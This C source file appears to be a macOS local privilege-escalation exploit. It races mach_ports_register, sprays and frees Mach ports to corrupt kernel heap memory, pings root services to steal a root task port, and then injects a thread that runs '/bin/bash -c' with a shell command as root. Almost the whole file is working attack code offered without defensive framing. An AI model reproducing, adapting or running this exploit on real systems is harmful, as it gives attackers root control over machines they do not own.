#include "task.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libproc.h>
#include <pthread.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

struct ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

struct ool_multi_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports[1000];
};

mach_port_t* ports_to_stash = NULL;
int n_stashed_ports = 0;

void prepare_port() ;

void run_command(mach_port_t target_task, char* command) {
  kern_return_t err;

  size_t command_length = strlen(command) + 1;
  size_t command_page_length = ((command_length + 0xfff) >> 12) << 12;
  command_page_length += 1; // for the stack

  // allocate some memory in the task
  mach_vm_address_t command_addr = 0;
  err = mach_vm_allocate(target_task,
                         &command_addr,
                         command_page_length,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    printf("mach_vm_allocate: %s\n", mach_error_string(err));
    return;
  }

  printf("allocated command at %llx\n", command_addr);
  uint64_t bin_bash = command_addr;
  uint64_t dash_c = command_addr + 0x10;
  uint64_t cmd = command_addr + 0x20;
  uint64_t argv = command_addr + 0x800;

  uint64_t argv_contents[] = {bin_bash, dash_c, cmd, 0};

  err = mach_vm_write(target_task,
                      bin_bash,
                      (mach_vm_offset_t)"/bin/bash",
                      strlen("/bin/bash") + 1);

  err = mach_vm_write(target_task,
                      dash_c,
                      (mach_vm_offset_t)"-c",
                      strlen("-c") + 1);

  err = mach_vm_write(target_task,
                      cmd,
                      (mach_vm_offset_t)command,
                      strlen(command) + 1);

  err = mach_vm_write(target_task,
                      argv,
                      (mach_vm_offset_t)argv_contents,
                      sizeof(argv_contents));

  if (err != KERN_SUCCESS) {
    printf("mach_vm_write: %s\n", mach_error_string(err));
    return;
  }

  // create a new thread:
  mach_port_t new_thread = MACH_PORT_NULL;
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;

  memset(&state, 0, sizeof(state));

  // the minimal register state we require:
  state.__rip = (uint64_t)execve;
  state.__rdi = (uint64_t)bin_bash;
  state.__rsi = (uint64_t)argv;
  state.__rdx = (uint64_t)0;

  err = thread_create_running(target_task,
                              x86_THREAD_STATE64,
                              (thread_state_t)&state,
                              stateCount,
                              &new_thread);

  if (err != KERN_SUCCESS) {
    printf("thread_create_running: %s\n", mach_error_string(err));
    return;
  }

  printf("done?\n");
}


void begin_stash(int n_ports) {
  ports_to_stash = calloc(sizeof(mach_port_t), n_ports);
}

void stash_port(mach_port_t p) {
  ports_to_stash[n_stashed_ports++] = p;
}

mach_port_t stashed_ports_q[10000] ;
int i_offset = 0 ;
int i_released = -20 ;

void* dp_control_port_racer_thread(void* arg) {
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
  
  for (;;) {
	  if (i_released < 0) continue;
	  break;
  }

  int i_count = 0 ;
  kern_return_t err;
  for (int i = 0; i < 2000; i++) {;
    // we've patched the generated code for mach_ports_register to only actually send one OOL port
    // but still set init_port_setCnt to the value passed here
	  mach_port_t p_self = mach_task_self();  
	  err = mach_ports_register(mach_task_self(), &p_self, 3);
	  if (err == KERN_SUCCESS)
	  {
	  	printf("failed to register for no-more-senders notification (%s)\n", mach_error_string(err));
		i_count++;
		if (i_count == 2) break;
	  }
  }

  i_released = 9999;
  return NULL;
}

void end_stash() {
  kern_return_t err;
  printf ("try to write data in kalloc.16:%d\n",0x1000);
  for (int i = 0 ; i != 0x1000 ; i++) {
	  mach_port_allocate(mach_task_self(),
			  MACH_PORT_RIGHT_RECEIVE,
			  &stashed_ports_q[i]);

	  struct ool_msg* stash_msg = malloc(sizeof(struct ool_msg));
	  memset(stash_msg, 0, sizeof(struct ool_msg));

	  stash_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
	  stash_msg->hdr.msgh_size = sizeof(struct ool_msg);
	  stash_msg->hdr.msgh_remote_port = stashed_ports_q[i];
	  stash_msg->hdr.msgh_local_port = MACH_PORT_NULL;
	  stash_msg->hdr.msgh_id = 0x41414141;

	  stash_msg->body.msgh_descriptor_count = 1;

	  stash_msg->ool_ports.address = ports_to_stash;
	  stash_msg->ool_ports.count = 2;//n_stashed_ports;
	  stash_msg->ool_ports.deallocate = 0;
	  stash_msg->ool_ports.disposition = MACH_MSG_TYPE_MAKE_SEND; // we don't hold a send for these ports
	  stash_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	  stash_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

	  // send it:
	  err = mach_msg(&stash_msg->hdr,
			  MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
			  (mach_msg_size_t)sizeof(struct ool_msg),
			  0,
			  MACH_PORT_NULL,
			  MACH_MSG_TIMEOUT_NONE,
			  MACH_PORT_NULL);
	  if (err != KERN_SUCCESS) {
		  printf("%s\n", mach_error_string(err));
	  }
  }
}

//
// did we get a notification message?
int got_no_more_senders(mach_port_t q) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       q,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  if (err == KERN_SUCCESS && msg_id == 0x46) {
    printf("got NMS\n");
    return 1;
  }
  return 0;
}

void prepare_port() {
  kern_return_t err;
  
  for (int i = 100 ; i != 300 ;i++)
  {
	  if (i%10 ==0)
		  mach_port_destroy(mach_task_self(),stashed_ports_q[i]); 
  }
}

mach_port_t lookup(char* name) {
	mach_port_t service_port = MACH_PORT_NULL;
	kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
	if(err != KERN_SUCCESS){
		printf("unable to look up %s\n", name);
		return MACH_PORT_NULL;
	}

	if (service_port == MACH_PORT_NULL) {
		printf("bad service port\n");
		return MACH_PORT_NULL;
	}
	return service_port;
}


void lookup_and_ping_service(char* name) {
  mach_port_t service_port = lookup(name);
  if (service_port == MACH_PORT_NULL) {
    printf("failed too lookup %s\n", name);
    return;
  }
  // send a ping message to make sure the service actually gets launched:
  kern_return_t err;
  mach_msg_header_t basic_msg;

  basic_msg.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  basic_msg.msgh_size        = sizeof(basic_msg);
  basic_msg.msgh_remote_port = service_port;
  basic_msg.msgh_local_port  = MACH_PORT_NULL;
  basic_msg.msgh_reserved    = 0;
  basic_msg.msgh_id          = 0x41414141;

  err = mach_msg(&basic_msg,
                 MACH_SEND_MSG,
                 sizeof(basic_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL); 
  if (err != KERN_SUCCESS) {
    printf("failed to send ping message to service %s (err: %s)\n", name, mach_error_string(err));
    return;
  }

  printf("pinged %s\n", name);
}

void* do_lookups(void* arg) {
  lookup_and_ping_service("com.apple.storeaccountd");
  lookup_and_ping_service("com.apple.hidfud");
  lookup_and_ping_service("com.apple.netauth.sys.gui");
  lookup_and_ping_service("com.apple.netauth.user.gui");
  lookup_and_ping_service("com.apple.avbdeviced");
  return NULL;
}

void start_root_lookups_thread() {
  pthread_t thread;
  pthread_create(&thread, NULL, do_lookups, NULL);
}


mach_port_t notify_q[20000];

int main() {
  kern_return_t err;
  mach_port_t middle_ports ;
ag:
  i_released = -20 ;
  mach_port_allocate(mach_task_self(),MACH_PORT_RIGHT_RECEIVE,&middle_ports);

  printf("port name %d\n",middle_ports);



  begin_stash(2);
  stash_port(middle_ports);
  end_stash();

  pthread_t racer_thread;
  pthread_create(&racer_thread, NULL, dp_control_port_racer_thread, NULL);

  for (int i = 0 ; i != 0x1000 ;i++)
  {
	  if (i%0x10 ==0) {
		  if (i_released <0) i_released++;
		    mach_port_destroy(mach_task_self(),stashed_ports_q[i]); 
	  }
  }



out:

  for (int i = 0 ; i!=3; i++){
  	  printf("waiting!\n");
	  sleep(1);
	  if (i_released < 9999) continue;
	  
	  break;
  }

  printf("OUT!\n");
  mach_port_insert_right(mach_task_self(), middle_ports, middle_ports, MACH_MSG_TYPE_MAKE_SEND);


  for (int i = 0 ; i != 0x1000 ;i++)
  {
	  if (i == 0xfff) {
//		  __asm ("int3");
  		  start_root_lookups_thread();
	  }
	  if (i%0x10 !=0) {
		  mach_port_destroy(mach_task_self(),stashed_ports_q[i]); 
	  }
  }
  sleep(2);

  free(ports_to_stash);


  printf("Try Hook!\n");


  size_t max_request_size = 0x10000;	
  mach_msg_header_t* request = malloc(max_request_size);
  pid_t pid = 0;
  pid_for_task(middle_ports, &pid);
  if (pid != 0) {
	  printf("got task port for pid: %d\n", pid);
  }
  int proc_err;
  struct proc_bsdshortinfo info = {0};
  proc_err = proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
  if (proc_err <= 0) {
	  // fail
	  printf("proc_pidinfo failed\n");
	  //goto ag;
  }else  {
	  if (info.pbsi_uid == 0) {
		  printf("got r00t!! ******************\n");
		  printf("(via task port for: %s)\n", info.pbsi_comm);
		  run_command(middle_ports, "echo hello > /tmp/hello_from_root");
		  for (;;)
		  {
		  	  printf("check r00t!! ******************\n");
			  sleep(5);
		  }
	  }
  }



  /*
  memset(request, 0, max_request_size);
  err = mach_msg(request,
		  MACH_RCV_MSG | 
		  MACH_RCV_LARGE, // leave larger messages in the queue
		  0,
		  max_request_size,
		  middle_ports,
		  0,
		  0);


  if (err != KERN_SUCCESS) {
	  printf("error receiving on port set: %s\n", mach_error_string(err));
	  exit(EXIT_FAILURE);
  }

  printf("got a request, fixing it up...\n");
  */



  return 0;
}

